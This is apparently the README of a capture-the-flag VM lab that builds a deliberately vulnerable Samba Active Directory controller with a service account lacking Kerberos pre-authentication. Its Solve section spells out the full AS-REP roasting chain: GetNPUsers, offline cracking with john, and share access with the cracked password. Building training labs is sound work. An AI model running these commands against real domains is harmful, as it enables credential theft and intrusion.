# AS-REP Roasting (Active Directory)

One Isoloom **VM lab** — **one `isoloom.yml`** — for the realm **LAKESIDE.LAB** (Lakeside Regional
Hospital). A single Samba Active Directory Domain Controller (`dc`) has one legacy document-scanner
service account, `svc-scanner`, with Kerberos **pre-authentication disabled**
(`userAccountControl` bit `DONT_REQ_PREAUTH`) and a weak, wordlist-crackable password. With only a
username list and no credentials, a player AS-REP roasts `svc-scanner`, cracks the hash offline,
and reads the flag from an imaging share only that account may open.

## A Fedora VM

The `dc` machine's recipe is a `playbook` step, which in Isoloom 1.0 runs in a VM only. So the lab
renders the VM targets and refuses the container ones:

| Command | What it builds |
| --- | --- |
| `isoloom generate vagrant` (also `proxmox`, `esxi`, `aws`, `azure`, ...) | a fresh Fedora VM that Isoloom's Ansible controller sets up with `provision/dc.yml` |
| `isoloom generate docker` | **refused** — "a playbook step runs in a VM only" |

**Fedora** on purpose. Fedora's Samba is built against the **MIT KDC**, which honours
`UF_DONT_REQUIRE_PREAUTH`, so the classic no-pre-auth roast works — exactly as against a real
Windows DC. Debian/Ubuntu Samba is built against **Heimdal**, which ignores the flag and answers
`KDC_ERR_PREAUTH_REQUIRED`, which would make the lab unsolvable. So the OS is a hard requirement,
not a preference.

The flag arrives as Isoloom's sensitive input at `/ctf/flag`; `provision/dc.yml` copies it into the
`imaging` share (only `svc-scanner` and Domain Admins may read). The end-to-end check,
`/opt/asrep/check.sh`, proves the lab from inside the DC: roast with `GetNPUsers -no-pass`, crack
the AES AS-REP, read the flag, and a negative control confirms an ordinary account cannot.

| Machine | Service |
| --- | --- |
| `dc` | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## Run it

```bash
# A Fedora VM, on a libvirt/VirtualBox/Proxmox/ESXi/cloud host
isoloom run vagrant . && isoloom test vagrant . && isoloom down vagrant .
```

## Solve

```bash
# resolver + /etc/krb5.conf pointed at the DC, then:
GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format john
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash      # AES AS-REP; hashcat -m 18200 is RC4-only
smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'
```

This environment is deliberately vulnerable: keep it isolated.

## Layout

- `isoloom.yml` — the single VM spec.
- `provision/dc.yml` — the Ansible playbook that sets the DC up on a fresh Fedora VM.
- `provision/files/` — assets the playbook ships to the DC: `check.sh`, `crack.py`, `users.txt`,
  `wordlist.txt`, `vault-share.conf`.
- `.github/workflows/` — `validate.yml` (spec + VM generation), `publish.yml` (register).
